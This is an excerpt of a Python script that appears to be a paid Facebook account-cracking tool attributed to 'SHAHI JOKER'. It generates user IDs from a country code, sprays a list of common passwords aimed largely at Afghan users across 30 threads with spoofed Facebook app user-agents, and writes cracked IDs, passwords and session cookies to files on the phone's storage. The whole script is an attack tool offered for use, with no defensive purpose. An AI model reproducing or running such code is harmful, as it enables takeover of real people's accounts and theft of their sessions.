...
def uaa():
    return "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";FBAN/FBIOS;FBAV/163.0.0.54.96;FBBV/34183777;FBDV/iPhone6,2;FBMD/iPhone;FBSN/iOS;FBSV/7;FBSS/2;FBCR/inwi;FBID/phone;FBLC/fr_FR;FBOP/45;FBRV/34683906]"
...
\033[1;31m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_\033[92;1m XD
\033[1;37m----------------------------------------------
 [•] Author     :  SHAHI JOKER
 [•] Facebook   :  JOKER KHANOO
 [•] Tool       :  PAID
 [•] Version    :  33.8
\033[1;37m----------------------------------------------""")
def linex():
...
def menu():
		...
		#	os.system('xdg-open)
			if xd in ['1','01']:
				...
				os.system('xdg-open https://www.facebook.com/SHAHIJOKER')
				menu()
			elif xd in ['0','00']:
				exit(' Thanks for use 🥰 ')
			else:
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 9370,9379,9378,9377')
		...
		with tred(max_workers=30) as zain:
			...
			for psx in user:
				ids = code+psx
				passlist = [psx,ids,'khan123','Afghan123','afghan123','Afghan1234','afghan1234','Afghan12345','afghan12345','۱۲۳۴۵۶','100200','10002000','500500','500600','Afghanistan','afghanistan','۱۲۳۴۵۶۷۸۹','Kabul123','Kabul12345','khan12345']
...
def rd1(ids,passlist):
        global loop
        global oks
        sys.stdout.write('\r\r\033[1;37m [JOKER-XD] %s|\033[1;37mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        try:
                for pas in passlist:
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        open('/sdcard/JOKER-R-COKIE.txt','a').write(str(uid)+'|'+pas+ ' | ' +coki+'\n')
                                        open('/sdcard/JOKER-R-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(ids))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        #print('\r\r\x1b[1;31m [JOKER-CP] '+str(ids)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER-R-CP.txt','a').write(str(ids)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
...
def api2(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [JOKER-M1] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                open('/sdcard/JOKER-file-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                #open('/sdcard/JOKER-file-coki-OK.txt', 'a').write(ids+'|'+pas+'|'+kuki+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        ##########print('\r\r\x1b[38;5;208m [ZAIN-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/JOKER-file-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
